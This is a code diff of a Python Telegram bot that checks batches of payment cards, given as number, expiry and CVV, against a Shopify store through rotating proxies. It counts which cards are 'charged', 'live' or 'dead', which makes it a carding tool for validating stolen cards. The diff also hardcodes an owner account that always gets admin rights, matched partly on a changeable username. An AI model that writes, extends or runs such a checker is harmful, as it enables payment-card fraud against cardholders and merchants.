@@ -15,7 +15,10 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-ADMIN_IDS = [1805944073]
+ADMIN_OWNER_ID = 6124719858
+ADMIN_OWNER_USERNAME = 'MUMIRU_01'
+ADMIN_IDS = [ADMIN_OWNER_ID, 1805944073]
+
 GLOBAL_SETTINGS = {
     'url': None,
     'proxies': [],
@@ -58,6 +61,7 @@ def load_settings():
                 GLOBAL_SETTINGS.update(loaded_settings)
                 
                 loaded_admin_ids = data.get('admin_ids', [])
+                # Ensure original admins are still there if needed, but primary is the new one
                 if 1805944073 not in loaded_admin_ids:
                     loaded_admin_ids.insert(0, 1805944073)
                 ADMIN_IDS[:] = loaded_admin_ids
@@ -66,18 +70,27 @@ def load_settings():
 
 def save_settings():
     try:
+        # Update admin ids in file if needed, keeping 6124719858 as primary
+        current_admins = list(set(ADMIN_IDS + [ADMIN_OWNER_ID]))
         with open(SETTINGS_FILE, 'w') as f:
             json.dump({
                 'settings': GLOBAL_SETTINGS,
-                'admin_ids': ADMIN_IDS
+                'admin_ids': current_admins
             }, f, indent=2)
     except Exception as e:
         logger.error(f"Error saving settings: {e}")
 
 load_settings()
 
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+def is_admin(user_id: int, username: str = None) -> bool:
+    """Check if user is admin/owner"""
+    if user_id == ADMIN_OWNER_ID:
+        return True
+    if username and username.lower() == ADMIN_OWNER_USERNAME.lower():
+        return True
+    if user_id in ADMIN_IDS:
+        return True
+    return False
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -292,17 +305,28 @@ async def msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     cards = context.args[:10]
-    msg = await update.message.reply_text(f"⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(cards)} 𝗰𝗮𝗿𝗱𝘀...\n\n0% □□□□□□□□□□ 0.00s")
+    msg = await update.message.reply_text(f"""𝑺𝒕𝒂𝒕𝒖𝒔: 🔄 Checking... 
+━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━
+📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: 0/{len(cards)} [░░░░░░░░░░] 0.0% 
+🔥Charged : 0 | ✅ 𝑳𝒊𝒗𝒆: 0  
+❌ 𝑫𝒆𝒂𝒅: 0 | ⚠️ 𝑬𝒓𝒓𝒐𝒓𝒔: 0
+━━━━━━━━━━━━━━━━━━
+👤 User: @{username}""")
     
     results = []
-    username = update.effective_user.username or update.effective_user.first_name or "User"
+    charged_count = 0
+    live_count = 0
+    dead_count = 0
+    error_count = 0
     
+    username = update.effective_user.username or update.effective_user.first_name or "User"
     overall_start = time.time()
     
     for i, card_str in enumerate(cards, 1):
         card_data = card_str.split('|')
         if len(card_data) != 4:
             results.append(f"{i}. ❌ Invalid format")
+            error_count += 1
             continue
         
         card_num, month, year, cvv = card_data
@@ -313,11 +337,17 @@ async def msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             bin_info = await get_bin_info(card_num[:6])
             checker = ShopifyChecker(proxy=proxy)
             
-            progress_percent = int((i / len(cards)) * 100)
+            progress_percent = (i / len(cards)) * 100
             progress_filled = int((i / len(cards)) * 10)
-            progress_bar = "■" * progress_filled + "□" * (10 - progress_filled)
-            elapsed_so_far = time.time() - overall_start
-            await msg.edit_text(f"⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {i}/{len(cards)}...\n\n{progress_percent}% {progress_bar} {elapsed_so_far:.2f}s")
+            progress_bar = "█" * progress_filled + "░" * (10 - progress_filled)
+            
+            await msg.edit_text(f"""𝑺𝒕𝒂𝒕𝒖𝒔: 🔄 Checking... 
+━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━
+📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {i}/{len(cards)} [{progress_bar}] {progress_percent:.1f}% 
+🔥Charged : {charged_count} | ✅ 𝑳𝒊𝒗𝒆: {live_count}  
+❌ 𝑫𝒆𝒂𝒅: {dead_count} | ⚠️ 𝑬𝒓𝒓𝒐𝒓𝒔: {error_count}
+━━━━━━━━━━━━━━━━━━
+👤 User: @{username}""")
             
             result_data = await checker.check_card(
                 site_url=GLOBAL_SETTINGS['url'],
@@ -340,16 +370,18 @@ async def msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not result or not isinstance(result, str):
                 result = "Card Declined"
             
-            # Clean up empty or whitespace-only results
-            if isinstance(result, str) and not result.strip():
-                result = "Card Declined"
-            
-            if "✅" in result or "charged" in result.lower() or "order placed" in result.lower() or "card live" in result.lower() or "approved" in result.lower():
-                status = "✅ APPROVED"
+            if "charged" in result.lower() or "order placed" in result.lower():
+                status = "🔥 CHARGED"
+                charged_count += 1
+            elif "✅" in result or "card live" in result.lower() or "approved" in result.lower():
+                status = "✅ LIVE"
+                live_count += 1
             elif "⚠️" in result or "try again" in result.lower() or "retry" in result.lower():
                 status = "⚠️ RETRY"
+                error_count += 1
             else:
-                status = "❌ DECLINED"
+                status = "❌ DEAD"
+                dead_count += 1
             
             bin_str = ""
             if bin_info:
